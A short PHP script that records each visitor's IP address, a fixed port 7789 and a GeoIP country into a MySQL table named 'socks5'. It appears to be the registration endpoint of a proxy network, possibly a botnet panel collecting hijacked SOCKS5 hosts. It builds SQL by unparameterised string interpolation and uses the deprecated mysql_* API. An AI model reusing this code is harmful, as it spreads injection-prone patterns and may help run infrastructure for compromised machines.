<?php
include('config.php');
//$ip=$_GET['ip'];
$port=":7789";
//$contry=$_GET['contry'];
$ip=$_SERVER['REMOTE_ADDR'];

include("geoip.inc");
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
$country = geoip_country_name_by_addr($gi,$_SERVER['REMOTE_ADDR']);
geoip_close($gi);
echo $country;

mysql_query("INSERT INTO socks5 (ip, port, contry)
VALUES ('$ip', '$port', '$country')");

 mysql_close($connect);
 ?>